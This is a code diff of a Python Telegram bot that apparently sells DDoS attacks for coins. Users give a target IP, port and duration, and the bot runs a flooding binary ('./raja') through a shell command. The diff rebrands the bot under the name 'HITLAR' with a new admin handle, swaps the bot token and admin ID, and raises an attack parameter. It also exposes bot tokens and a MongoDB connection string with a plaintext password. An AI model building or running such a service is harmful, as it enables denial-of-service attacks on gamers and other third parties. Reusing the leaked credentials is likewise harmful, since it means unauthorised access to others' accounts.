@@ -9,8 +9,8 @@ attack_in_progress = False
 current_attack = None  # Store details of the current attack
 attack_history = []  # Store attack logs
 
-TELEGRAM_BOT_TOKEN = '8057906498:AAHhVybZkBAqML80SfGaIvLnbpuCJZhVkNo'
-ADMIN_USER_ID = 7353797869
+TELEGRAM_BOT_TOKEN = '8057906498:AAFwPWGn3d5DZreMaUevYAQr5cJyEBa349I'
+ADMIN_USER_ID = 5834054446
 MONGO_URI = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
 DB_NAME = "Roxz"
 COLLECTION_NAME = "users"
@@ -40,7 +40,7 @@ async def update_user(user_id, coins):
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
-        "*❄️ WELCOME TO MONSTER😈 DDOS BOT ❄️*\n\n"
+        "*❄️ WELCOME TO HITLAR😈 DDOS BOT ❄️*\n\n"
         "*🔥 Yeh bot apko deta hai hacking ke maidan mein asli mazza! 🔥*\n\n"
         "*✨ Key Features: ✨*\n"
         "🚀 *𝘼𝙩𝙩𝙖𝙘𝙠 𝙠𝙖𝙧𝙤 𝙖𝙥𝙣𝙚 𝙤𝙥𝙥𝙤𝙣𝙚𝙣𝙩𝙨 𝙥𝙖𝙧 𝘽𝙜𝙢𝙞 𝙈𝙚 /attack*\n"
@@ -49,7 +49,7 @@ async def start(update: Update, context: CallbackContext):
         "*⚠️ Kaise Use Kare? ⚠️*\n"
         "*Commands ka use karo aur commands ka pura list dekhne ke liye type karo: /help*\n\n"
         "*💬 Queries or Issues? 💬*\n"
-        "*Contact Admin: @Mk_ddos*"
+        "*Contact Admin: @X_HITLER*"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
@@ -92,7 +92,7 @@ async def attack(update: Update, context: CallbackContext):
     if user["coins"] < COINS_REQUIRED_PER_ATTACK:
         await context.bot.send_message(
             chat_id=chat_id,
-            text="*💰 Bhai, tere paas toh coins nahi hai! Pehle admin ke paas ja aur coins le aa. 😂 DM:- @Mk_ddos*",
+            text="*💰 Bhai, tere paas toh coins nahi hai! Pehle admin ke paas ja aur coins le aa. 😂 DM:- @X_HITLER*",
             parse_mode='Markdown'
         )
         return
@@ -172,7 +172,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./raja {ip} {port} {duration} {900} {1200}"
+        command = f"./raja {ip} {port} {duration} {999} {1200}"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
@@ -230,7 +230,7 @@ async def myinfo(update: Update, context: CallbackContext):
 async def help(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
-        "*🛠️ @Mk_ddos VIP DDOS Bot Help Menu 🛠️*\n\n"
+        "*🛠️ @X_HITLER VIP DDOS Bot Help Menu 🛠️*\n\n"
         "🌟 *Yahan hai sab kuch jo tumhe chahiye!* 🌟\n\n"
         "📜 *Available Commands:* 📜\n\n"
         "1️⃣ *🔥 /attack <ip> <port> <duration>*\n"
@@ -248,7 +248,7 @@ async def help(update: Update, context: CallbackContext):
         "   - *Ab ye toh tum already use kar rahe ho! Yeh command bot ke saare features explain karta hai.*\n\n"
         "🚨 *𝐈𝐦𝐩𝐨𝐫𝐭𝐚𝐧𝐭 𝐓𝐢𝐩𝐬:* 🚨\n"
         "- *BOT REPLY NAA DE ISKA MATLAB KOI AUR BNDA ATTACK LAGYA HAI SO WAIT.*\n"
-        "- *Agar koi dikkat aaye toh admin ko contact karo: @Mk_ddos*\n\n"
+        "- *Agar koi dikkat aaye toh admin ko contact karo: @X_HITLER@*\n\n"
         "💥 *Ab jao aur hacker banne ka natak shuru karo!* 💥"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
